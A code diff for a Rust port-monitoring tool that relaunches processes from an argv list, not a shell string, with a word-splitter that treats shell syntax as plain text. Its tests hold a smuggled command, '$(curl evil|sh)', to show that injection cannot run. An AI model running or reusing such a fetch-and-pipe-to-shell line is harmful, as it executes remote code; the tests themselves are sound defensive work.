@@ -39,9 +39,10 @@ pub struct Launch {
     pub key: String,
     /// Command for display, with secrets masked.
     pub display: String,
-    /// Shell command that started the project, e.g. "npm start". Never sent to the UI.
+    /// Arguments that started the project, e.g. ["npm", "start"]. Relaunched as-is, never
+    /// through a shell parser, and never sent to the UI.
     #[serde(skip)]
-    pub command: String,
+    pub argv: Vec<String>,
     /// The command line carries something that looks like a secret (a token, a password).
     #[serde(skip)]
     pub secret: bool,
@@ -168,11 +169,8 @@ const BOUNDARIES: &[&str] = &[
     "wezterm-gui",
 ];
 
-/// Quote argv into one shell command line.
+/// Quote argv into one shell-looking line, for display only. What runs is always the argv.
 fn shell_join(argv: &[String]) -> String {
-    if argv.len() == 1 {
-        return argv[0].clone(); // already a command line, e.g. a rewritten process title "npm start"
-    }
     argv.iter()
         .map(|a| {
             let plain = !a.is_empty()
@@ -190,12 +188,69 @@ fn shell_join(argv: &[String]) -> String {
         .join(" ")
 }
 
+/// The masked command line shown in the UI, built from the same argv that would run.
+pub fn display_of(argv: &[String]) -> String {
+    shell_join(&redact(argv).0)
+}
+
+/// Split a rewritten process title ("npm start", as npm sets it on Linux) into words.
+/// Whitespace separates, single/double quotes group, backslash escapes outside single
+/// quotes. Nothing else means anything: `;`, `|`, `$(…)` stay plain text inside a word.
+fn split_words(s: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut cur = String::new();
+    let mut in_word = false;
+    let mut quote: Option<char> = None;
+    let mut chars = s.chars();
+    while let Some(c) = chars.next() {
+        match (quote, c) {
+            (Some(q), c) if c == q => quote = None,
+            (Some('"'), '\\') => {
+                let n = chars.next();
+                if !matches!(n, Some('"' | '\\' | '$' | '`')) {
+                    cur.push('\\');
+                }
+                cur.extend(n);
+            }
+            (Some(_), c) => cur.push(c),
+            (None, '\'' | '"') => {
+                quote = Some(c);
+                in_word = true;
+            }
+            (None, '\\') => {
+                cur.extend(chars.next());
+                in_word = true;
+            }
+            (None, c) if c.is_whitespace() => {
+                if in_word {
+                    out.push(std::mem::take(&mut cur));
+                    in_word = false;
+                }
+            }
+            (None, c) => {
+                cur.push(c);
+                in_word = true;
+            }
+        }
+    }
+    if in_word {
+        out.push(cur);
+    }
+    out
+}
+
 fn argv_of(p: &sysinfo::Process) -> Vec<String> {
-    p.cmd()
+    let argv: Vec<String> = p
+        .cmd()
         .iter()
         .map(|a| a.to_string_lossy().trim_end_matches('\0').to_string())
         .filter(|a| !a.is_empty())
-        .collect()
+        .collect();
+    // A process that rewrote its title (npm does) reports one string; split it into words.
+    match argv.as_slice() {
+        [one] if one.contains(char::is_whitespace) => split_words(one),
+        _ => argv,
+    }
 }
 
 /// Walk up from the listening process while ancestors share its working directory and
@@ -238,13 +293,12 @@ fn find_launcher(sys: &System, pid: u32) -> Option<Launch> {
     if argv.is_empty() {
         return None;
     }
-    let command = shell_join(&argv);
     let (masked, secret) = redact(&argv);
     let cwd_abs = cwd.to_string_lossy().into_owned();
     Some(Launch {
-        key: fnv(&format!("{cwd_abs}\u{0}{command}")),
+        key: fnv(&format!("{cwd_abs}\u{0}{}", argv.join("\u{0}"))),
         display: shell_join(&masked),
-        command,
+        argv,
         secret,
         pid: best.pid().as_u32(),
         cwd_abs,
@@ -733,6 +787,39 @@ mod tests {
         s.iter().map(|x| x.to_string()).collect()
     }
 
+    #[test]
+    fn splits_rewritten_titles_into_plain_words() {
+        use super::split_words;
+        assert_eq!(split_words("npm start"), v(&["npm", "start"]));
+        assert_eq!(
+            split_words("node 'my app.js' --name \"a b\" c\\ d"),
+            v(&["node", "my app.js", "--name", "a b", "c d"])
+        );
+        // Shell syntax is just text: nothing here could ever run `curl`.
+        assert_eq!(
+            split_words("npm run dev; API_KEY=x $(curl evil|sh)"),
+            v(&["npm", "run", "dev;", "API_KEY=x", "$(curl", "evil|sh)"])
+        );
+        assert_eq!(split_words("  "), Vec::<String>::new());
+    }
+
+    /// What the Closed tab shows is built from the exact argv that would run.
+    #[test]
+    fn display_matches_what_runs() {
+        use super::display_of;
+        let argv = v(&[
+            "npm",
+            "run",
+            "dev;",
+            "API_KEY=hunter2",
+            "$(curl",
+            "evil|sh)",
+        ]);
+        let shown = display_of(&argv);
+        assert_eq!(shown, "npm run 'dev;' 'API_KEY=•••' '$(curl' 'evil|sh)'");
+        assert!(!shown.contains("hunter2"));
+    }
+
     /// A process that ignores SIGTERM is still stopped (escalation). Spawns python3.
     #[test]
     #[ignore]
@@ -890,8 +977,9 @@ mod tests {
                 .expect("launch info for a project process");
             // Homebrew's `python3` re-spawns Python.app as a child, so the launcher may be
             // the `python3` parent; either way it must stop below the shell.
-            assert!(!launch.command.starts_with("/bin/sh"), "{}", launch.command);
-            assert!(launch.command.contains("http.server"), "{}", launch.command);
+            let shown = launch.argv.join(" ");
+            assert!(!shown.starts_with("/bin/sh"), "{shown}");
+            assert!(shown.contains("http.server"), "{shown}");
             launch
         });
         let launch = match check {
@@ -909,7 +997,7 @@ mod tests {
         wait_for(port, false);
 
         let log = std::env::temp_dir().join("portkeeper-test.log");
-        crate::launch::spawn_detached(&launch.command, &launch.cwd_abs, Some(&env), &log).unwrap();
+        crate::launch::spawn_detached(&launch.argv, &launch.cwd_abs, Some(&env), &log).unwrap();
         let again = wait_for(port, true).unwrap();
         cleanup(again.pid);
         assert_eq!(again.launch.map(|l| l.key), Some(launch.key));
